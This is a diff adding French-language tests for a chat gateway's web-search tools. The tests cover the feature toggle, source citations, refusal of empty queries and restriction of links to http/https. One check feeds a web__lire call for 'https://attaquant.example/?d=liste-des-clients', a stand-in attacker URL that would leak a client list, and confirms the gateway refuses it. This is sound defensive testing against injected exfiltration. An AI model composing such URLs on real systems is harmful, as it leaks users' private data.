@@ -6352,6 +6352,56 @@ console.log("\n16 ter. Google Docs, Google Forms et Dropbox");
   verifier("documents : l'essai contre les faux fournisseurs s'est déroulé jusqu'au bout", essai.status === 0, `${essai.status} ${lignes.slice(-6).join(" ")}`);
 }
 
+/*
+ * Recherche sur le web du Chat (gateway/src/rechercheWeb.ts, 28/09/2026,
+ * SECURITE.md § 50). Ici, les pièces seules, sans réseau ; puis, de bout en
+ * bout, scripts/essai-recherche-web.mjs (faux DuckDuckGo, fausses pages, faux
+ * modèles, aucune sortie : chaque requête vers le dehors et chaque résolution
+ * de nom y sont interceptées), repris sous « recherche web : ».
+ */
+console.log("\n17. Recherche sur le web du Chat : rien sans la bascule, sources citées, pages piégées, réseau interne, petit modèle, profil");
+{
+  const { pathToFileURL: versUrl } = await import("node:url");
+  const rw = await import(versUrl(join(RACINE, "gateway", "src", "rechercheWeb.ts")).href);
+  const sourceChat = readFileSync(join(RACINE, "gateway", "src", "chat.ts"), "utf8");
+  verifier("chat.ts : la recherche web n'existe que pour l'écran de Helix et une demande qui porte « web: true »", /const demandeWeb = interfaceHelix && !callerTools && body\.web === true;/.test(sourceChat), "demandeWeb");
+  verifier("chat.ts : le champ « web » est retiré de ce qui part au moteur de modèles", /web: _w, \.\.\.rest/.test(sourceChat), "basePayload");
+  verifier("le profil de cette instance ne dit rien : la recherche est permise, et le moteur nommé", rw.etat().autorisee === true && rw.etat().moteur === "DuckDuckGo", JSON.stringify(rw.etat()));
+  const r = new rw.RechercheWeb(["Regarde https://exemple.org/devis-42 s'il te plaît"], 4);
+  const composee = await r.appeler("web__lire", { adresse: "https://attaquant.example/?d=liste-des-clients" });
+  verifier("une adresse que le modèle compose (jamais vue pendant la demande) est refusée avant toute connexion", !composee.ok && /déjà vue/.test(composee.content), composee.content.slice(0, 120));
+  const vide = await r.appeler("web__chercher", { requete: "   " });
+  verifier("une recherche vide est refusée sans rien envoyer", !vide.ok, vide.content);
+  verifier("les deux outils, et seulement eux ; la consigne d'un petit modèle est courte et numérotée", JSON.stringify(r.outils().map((o) => o.function.name)) === JSON.stringify(["web__chercher", "web__lire"]) && /^Recherche sur le web \(activée/.test(r.consigne(true)) && r.consigne(true).length < 500, r.consigne(true));
+  r.fermer();
+  const { modifie: modifieWeb } = await import(versUrl(join(RACINE, "gateway", "src", "approbation.ts")).href);
+  verifier("chercher et lire une page restent des lectures pour la barrière (carte au niveau « Demander pour tout » seulement)", !modifieWeb("web__chercher") && !modifieWeb("web__lire"), "modification");
+  verifier("la requête donnée au moteur à la place du modèle : la question, sur une ligne, 200 caractères au plus", rw.requeteDe("  Quelle\nhauteur ?  ") === "Quelle hauteur ?" && rw.requeteDe("x".repeat(500)).length === 200, rw.requeteDe("  Quelle\nhauteur ?  "));
+  const sourceLien = readFileSync(join(RACINE, "src", "lib", "rechercheWeb.ts"), "utf8");
+  verifier("écran : une source ne devient un lien qu'en http ou https (un Chat partagé ne porte pas de javascript:)", /u\.protocol === "https:" \|\| u\.protocol === "http:"/.test(sourceLien), "lienSur");
+
+  const essai = await new Promise((fin) => {
+    const e = spawn(process.execPath, [join(RACINE, "scripts", "essai-recherche-web.mjs")], { stdio: ["ignore", "pipe", "pipe"] });
+    let sortie = "";
+    e.stdout.on("data", (b) => (sortie += b));
+    e.stderr.on("data", (b) => (sortie += b));
+    const minuterie = setTimeout(() => e.kill(), 5 * 60_000);
+    e.on("close", (status) => {
+      clearTimeout(minuterie);
+      fin({ status, sortie });
+    });
+  });
+  const lignes = essai.sortie.split("\n");
+  for (const ligne of lignes) {
+    const ok = /^\s+✓ (.*)$/.exec(ligne);
+    const ko = /^\s+✗ (.*?)(?:  —  obtenu : .*)?$/.exec(ligne);
+    if (ok) verifier(`recherche web : ${ok[1]}`, true, "");
+    else if (ko) verifier(`recherche web : ${ko[1]}`, false, ligne.split("  —  obtenu : ")[1] ?? "");
+    else if (/^[A-F]\. /.test(ligne)) console.log(`  ${ligne}`);
+  }
+  verifier("recherche web : l'essai contre le faux web s'est déroulé jusqu'au bout", essai.status === 0, `${essai.status} ${lignes.slice(-6).join(" ")}`);
+}
+
 console.log(`\n${reussis} vérification(s) réussie(s), ${echecs.length} échec(s).`);
 if (echecs.length) {
   console.log("Échecs :");
